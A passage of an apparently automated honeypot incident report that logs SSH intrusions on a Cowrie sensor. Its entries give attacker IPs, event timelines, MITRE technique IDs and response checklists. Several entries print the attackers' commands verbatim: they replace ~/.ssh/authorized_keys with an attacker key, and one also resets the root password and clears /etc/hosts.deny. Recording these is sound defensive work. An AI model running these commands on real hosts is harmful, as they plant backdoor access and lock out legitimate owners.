| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 17:59:41` | `cowrie.session.connect` |
| `2026-05-24 17:59:41` | `cowrie.client.version` |
| `2026-05-24 17:59:41` | `cowrie.client.kex` |
| `2026-05-24 17:59:42` | `cowrie.login.success` |
| `2026-05-24 17:59:43` | `cowrie.session.params` |
| `2026-05-24 17:59:43` | `cowrie.command.input` |
| `2026-05-24 17:59:43` | `cowrie.command.failed` |
| `2026-05-24 17:59:44` | `cowrie.log.closed` |
| `2026-05-24 17:59:44` | `cowrie.session.params` |
| `2026-05-24 17:59:44` | `cowrie.command.input` |
| `2026-05-24 17:59:44` | `cowrie.session.file_download` |
| `2026-05-24 17:59:44` | `cowrie.log.closed` |
| `2026-05-24 17:59:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.194.181[.]113` to AbuseIPDB if not already reported
- [ ] Block `200.194.181[.]113` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e2eefc8a036

| Field | Detail |
|---|---|
| **Source IP** | `200.194.181[.]113` |
| **First Seen** | 2026-05-24 17:59 |
| **Last Seen** | 2026-05-24 17:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 17:59:48` | `cowrie.session.connect` |
| `2026-05-24 17:59:48` | `cowrie.client.version` |
| `2026-05-24 17:59:48` | `cowrie.client.kex` |
| `2026-05-24 17:59:50` | `cowrie.login.success` |
| `2026-05-24 17:59:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.194.181[.]113` to AbuseIPDB if not already reported
- [ ] Block `200.194.181[.]113` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b37b0cba0d5

| Field | Detail |
|---|---|
| **Source IP** | `118.122.147[.]49` |
| **First Seen** | 2026-05-24 18:00 |
| **Last Seen** | 2026-05-24 18:01 |
| **Session Duration** | 39s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:KxZRkiOKAPAG"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 18:00:57` | `cowrie.session.connect` |
| `2026-05-24 18:00:57` | `cowrie.client.version` |
| `2026-05-24 18:00:57` | `cowrie.client.kex` |
| `2026-05-24 18:00:58` | `cowrie.login.success` |
| `2026-05-24 18:00:58` | `cowrie.session.params` |
| `2026-05-24 18:00:58` | `cowrie.command.input` |
| `2026-05-24 18:00:58` | `cowrie.command.failed` |
| `2026-05-24 18:00:59` | `cowrie.log.closed` |
| `2026-05-24 18:00:59` | `cowrie.session.params` |
| `2026-05-24 18:00:59` | `cowrie.command.input` |
| `2026-05-24 18:00:59` | `cowrie.session.file_download` |
| `2026-05-24 18:00:59` | `cowrie.log.closed` |
| `2026-05-24 18:01:28` | `cowrie.session.params` |
| `2026-05-24 18:01:28` | `cowrie.command.input` |
| `2026-05-24 18:01:29` | `cowrie.log.closed` |
| `2026-05-24 18:01:29` | `cowrie.session.params` |
| `2026-05-24 18:01:29` | `cowrie.command.input` |
| `2026-05-24 18:01:29` | `cowrie.log.closed` |
| `2026-05-24 18:01:30` | `cowrie.session.params` |
| `2026-05-24 18:01:30` | `cowrie.command.input` |
| `2026-05-24 18:01:30` | `cowrie.session.file_download` |
| `2026-05-24 18:01:30` | `cowrie.log.closed` |
| `2026-05-24 18:01:30` | `cowrie.session.params` |
| `2026-05-24 18:01:30` | `cowrie.command.input` |
| `2026-05-24 18:01:30` | `cowrie.log.closed` |
| `2026-05-24 18:01:31` | `cowrie.session.params` |
| `2026-05-24 18:01:31` | `cowrie.command.input` |
| `2026-05-24 18:01:31` | `cowrie.log.closed` |
| `2026-05-24 18:01:31` | `cowrie.session.params` |
| `2026-05-24 18:01:31` | `cowrie.command.input` |
| `2026-05-24 18:01:31` | `cowrie.command.input` |
| `2026-05-24 18:01:31` | `cowrie.log.closed` |
| `2026-05-24 18:01:32` | `cowrie.session.params` |
| `2026-05-24 18:01:32` | `cowrie.command.input` |
| `2026-05-24 18:01:32` | `cowrie.log.closed` |
| `2026-05-24 18:01:32` | `cowrie.session.params` |
| `2026-05-24 18:01:32` | `cowrie.command.input` |
| `2026-05-24 18:01:32` | `cowrie.log.closed` |
| `2026-05-24 18:01:33` | `cowrie.session.params` |
| `2026-05-24 18:01:33` | `cowrie.command.input` |
| `2026-05-24 18:01:33` | `cowrie.log.closed` |
| `2026-05-24 18:01:33` | `cowrie.session.params` |
| `2026-05-24 18:01:33` | `cowrie.command.input` |
| `2026-05-24 18:01:34` | `cowrie.log.closed` |
| `2026-05-24 18:01:34` | `cowrie.session.params` |
| `2026-05-24 18:01:34` | `cowrie.command.input` |
| `2026-05-24 18:01:34` | `cowrie.log.closed` |
| `2026-05-24 18:01:34` | `cowrie.session.params` |
| `2026-05-24 18:01:34` | `cowrie.command.input` |
| `2026-05-24 18:01:35` | `cowrie.log.closed` |
| `2026-05-24 18:01:35` | `cowrie.session.params` |
| `2026-05-24 18:01:35` | `cowrie.command.input` |
| `2026-05-24 18:01:35` | `cowrie.log.closed` |
| `2026-05-24 18:01:35` | `cowrie.session.params` |
| `2026-05-24 18:01:35` | `cowrie.command.input` |
| `2026-05-24 18:01:36` | `cowrie.log.closed` |
| `2026-05-24 18:01:36` | `cowrie.session.params` |
| `2026-05-24 18:01:36` | `cowrie.command.input` |
| `2026-05-24 18:01:36` | `cowrie.log.closed` |
| `2026-05-24 18:01:36` | `cowrie.session.params` |
| `2026-05-24 18:01:36` | `cowrie.command.input` |
| `2026-05-24 18:01:37` | `cowrie.log.closed` |
| `2026-05-24 18:01:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.122.147[.]49` to AbuseIPDB if not already reported
- [ ] Block `118.122.147[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93c01cfc36ee

| Field | Detail |
|---|---|
| **Source IP** | `200.194.181[.]113` |
| **First Seen** | 2026-05-24 18:12 |
| **Last Seen** | 2026-05-24 18:12 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 18:12:00` | `cowrie.session.connect` |
| `2026-05-24 18:12:00` | `cowrie.client.version` |
| `2026-05-24 18:12:01` | `cowrie.client.kex` |
| `2026-05-24 18:12:02` | `cowrie.login.success` |
| `2026-05-24 18:12:03` | `cowrie.session.params` |
| `2026-05-24 18:12:03` | `cowrie.command.input` |
| `2026-05-24 18:12:03` | `cowrie.command.failed` |
| `2026-05-24 18:12:03` | `cowrie.log.closed` |
| `2026-05-24 18:12:04` | `cowrie.session.params` |
| `2026-05-24 18:12:04` | `cowrie.command.input` |
| `2026-05-24 18:12:04` | `cowrie.session.file_download` |
| `2026-05-24 18:12:04` | `cowrie.log.closed` |
| `2026-05-24 18:12:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.194.181[.]113` to AbuseIPDB if not already reported
- [ ] Block `200.194.181[.]113` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8904ae4e375

| Field | Detail |
|---|---|
| **Source IP** | `200.194.181[.]113` |
| **First Seen** | 2026-05-24 18:12 |
| **Last Seen** | 2026-05-24 18:12 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 18:12:08` | `cowrie.session.connect` |
| `2026-05-24 18:12:08` | `cowrie.client.version` |
| `2026-05-24 18:12:08` | `cowrie.client.kex` |
| `2026-05-24 18:12:10` | `cowrie.login.success` |
| `2026-05-24 18:12:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.194.181[.]113` to AbuseIPDB if not already reported
- [ ] Block `200.194.181[.]113` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a71f86cb81f7

| Field | Detail |
|---|---|
| **Source IP** | `81.17.101[.]227` |
| **First Seen** | 2026-05-24 18:29 |
| **Last Seen** | 2026-05-24 18:29 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 18:29:38` | `cowrie.session.connect` |
| `2026-05-24 18:29:38` | `cowrie.client.version` |
| `2026-05-24 18:29:38` | `cowrie.client.kex` |
| `2026-05-24 18:29:39` | `cowrie.login.success` |
| `2026-05-24 18:29:39` | `cowrie.session.params` |
| `2026-05-24 18:29:39` | `cowrie.command.input` |
| `2026-05-24 18:29:39` | `cowrie.command.failed` |
| `2026-05-24 18:29:40` | `cowrie.log.closed` |
| `2026-05-24 18:29:40` | `cowrie.session.params` |
| `2026-05-24 18:29:40` | `cowrie.command.input` |
| `2026-05-24 18:29:40` | `cowrie.session.file_download` |
| `2026-05-24 18:29:40` | `cowrie.log.closed` |
| `2026-05-24 18:29:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.17.101[.]227` to AbuseIPDB if not already reported
- [ ] Block `81.17.101[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b99608fd6a34

| Field | Detail |
|---|---|
| **Source IP** | `81.17.101[.]227` |
| **First Seen** | 2026-05-24 18:29 |
| **Last Seen** | 2026-05-24 18:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 18:29:43` | `cowrie.session.connect` |
| `2026-05-24 18:29:43` | `cowrie.client.version` |
| `2026-05-24 18:29:43` | `cowrie.client.kex` |
| `2026-05-24 18:29:43` | `cowrie.login.success` |
| `2026-05-24 18:29:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.17.101[.]227` to AbuseIPDB if not already reported
- [ ] Block `81.17.101[.]227` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-115a6a1eaab2

| Field | Detail |
|---|---|
| **Source IP** | `81.17.101[.]227` |
| **First Seen** | 2026-05-24 18:34 |
| **Last Seen** | 2026-05-24 18:34 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 18:34:45` | `cowrie.session.connect` |
| `2026-05-24 18:34:45` | `cowrie.client.version` |
| `2026-05-24 18:34:46` | `cowrie.client.kex` |
| `2026-05-24 18:34:47` | `cowrie.login.success` |
| `2026-05-24 18:34:47` | `cowrie.session.params` |
| `2026-05-24 18:34:47` | `cowrie.command.input` |
| `2026-05-24 18:34:47` | `cowrie.command.failed` |
| `2026-05-24 18:34:47` | `cowrie.log.closed` |
| `2026-05-24 18:34:47` | `cowrie.session.params` |
| `2026-05-24 18:34:47` | `cowrie.command.input` |
| `2026-05-24 18:34:48` | `cowrie.session.file_download` |
| `2026-05-24 18:34:48` | `cowrie.log.closed` |
| `2026-05-24 18:34:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.17.101[.]227` to AbuseIPDB if not already reported
- [ ] Block `81.17.101[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-154939a17086

| Field | Detail |
|---|---|
| **Source IP** | `81.17.101[.]227` |
| **First Seen** | 2026-05-24 18:34 |
| **Last Seen** | 2026-05-24 18:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 18:34:50` | `cowrie.session.connect` |
| `2026-05-24 18:34:50` | `cowrie.client.version` |
| `2026-05-24 18:34:50` | `cowrie.client.kex` |
| `2026-05-24 18:34:51` | `cowrie.login.success` |
| `2026-05-24 18:34:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.17.101[.]227` to AbuseIPDB if not already reported
- [ ] Block `81.17.101[.]227` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3d388af509b

| Field | Detail |
|---|---|
| **Source IP** | `101.47.156[.]21` |
| **First Seen** | 2026-05-24 18:50 |
| **Last Seen** | 2026-05-24 18:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 18:50:17` | `cowrie.session.connect` |
| `2026-05-24 18:50:17` | `cowrie.client.version` |
| `2026-05-24 18:50:17` | `cowrie.client.kex` |
| `2026-05-24 18:50:17` | `cowrie.login.success` |
| `2026-05-24 18:50:17` | `cowrie.session.params` |
| `2026-05-24 18:50:17` | `cowrie.command.input` |
| `2026-05-24 18:50:17` | `cowrie.command.failed` |
| `2026-05-24 18:50:17` | `cowrie.log.closed` |
| `2026-05-24 18:50:17` | `cowrie.session.params` |
| `2026-05-24 18:50:17` | `cowrie.command.input` |
| `2026-05-24 18:50:17` | `cowrie.session.file_download` |
| `2026-05-24 18:50:17` | `cowrie.log.closed` |
| `2026-05-24 18:50:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.156[.]21` to AbuseIPDB if not already reported
- [ ] Block `101.47.156[.]21` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba92254d19c3

| Field | Detail |
|---|---|
| **Source IP** | `101.47.156[.]21` |
| **First Seen** | 2026-05-24 18:50 |
| **Last Seen** | 2026-05-24 18:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 18:50:19` | `cowrie.session.connect` |
| `2026-05-24 18:50:19` | `cowrie.client.version` |
| `2026-05-24 18:50:19` | `cowrie.client.kex` |
| `2026-05-24 18:50:19` | `cowrie.login.success` |
| `2026-05-24 18:50:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.156[.]21` to AbuseIPDB if not already reported
- [ ] Block `101.47.156[.]21` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-097d31863e53

| Field | Detail |
|---|---|
| **Source IP** | `101.47.156[.]21` |
| **First Seen** | 2026-05-24 18:54 |
| **Last Seen** | 2026-05-24 18:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 18:54:27` | `cowrie.session.connect` |
| `2026-05-24 18:54:27` | `cowrie.client.version` |
| `2026-05-24 18:54:27` | `cowrie.client.kex` |
| `2026-05-24 18:54:27` | `cowrie.login.success` |
| `2026-05-24 18:54:27` | `cowrie.session.params` |
| `2026-05-24 18:54:27` | `cowrie.command.input` |
| `2026-05-24 18:54:27` | `cowrie.command.failed` |
| `2026-05-24 18:54:27` | `cowrie.log.closed` |
| `2026-05-24 18:54:28` | `cowrie.session.params` |
| `2026-05-24 18:54:28` | `cowrie.command.input` |
| `2026-05-24 18:54:28` | `cowrie.session.file_download` |
| `2026-05-24 18:54:28` | `cowrie.log.closed` |
| `2026-05-24 18:54:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.156[.]21` to AbuseIPDB if not already reported
- [ ] Block `101.47.156[.]21` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7293c35b668b

| Field | Detail |
|---|---|
| **Source IP** | `101.47.156[.]21` |
| **First Seen** | 2026-05-24 18:54 |
| **Last Seen** | 2026-05-24 18:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 18:54:29` | `cowrie.session.connect` |
| `2026-05-24 18:54:29` | `cowrie.client.version` |
| `2026-05-24 18:54:29` | `cowrie.client.kex` |
| `2026-05-24 18:54:30` | `cowrie.login.success` |
| `2026-05-24 18:54:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.156[.]21` to AbuseIPDB if not already reported
- [ ] Block `101.47.156[.]21` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b634f727ca0

| Field | Detail |
|---|---|
| **Source IP** | `101.47.156[.]21` |
| **First Seen** | 2026-05-24 18:58 |
| **Last Seen** | 2026-05-24 18:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 18:58:31` | `cowrie.session.connect` |
| `2026-05-24 18:58:31` | `cowrie.client.version` |
| `2026-05-24 18:58:31` | `cowrie.client.kex` |
| `2026-05-24 18:58:31` | `cowrie.login.success` |
| `2026-05-24 18:58:31` | `cowrie.session.params` |
| `2026-05-24 18:58:31` | `cowrie.command.input` |
| `2026-05-24 18:58:31` | `cowrie.command.failed` |
| `2026-05-24 18:58:31` | `cowrie.log.closed` |
| `2026-05-24 18:58:31` | `cowrie.session.params` |
| `2026-05-24 18:58:31` | `cowrie.command.input` |
| `2026-05-24 18:58:31` | `cowrie.session.file_download` |
| `2026-05-24 18:58:31` | `cowrie.log.closed` |
| `2026-05-24 18:58:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.156[.]21` to AbuseIPDB if not already reported
- [ ] Block `101.47.156[.]21` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a3e3b18edaf

| Field | Detail |
|---|---|
| **Source IP** | `101.47.156[.]21` |
| **First Seen** | 2026-05-24 18:58 |
| **Last Seen** | 2026-05-24 18:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
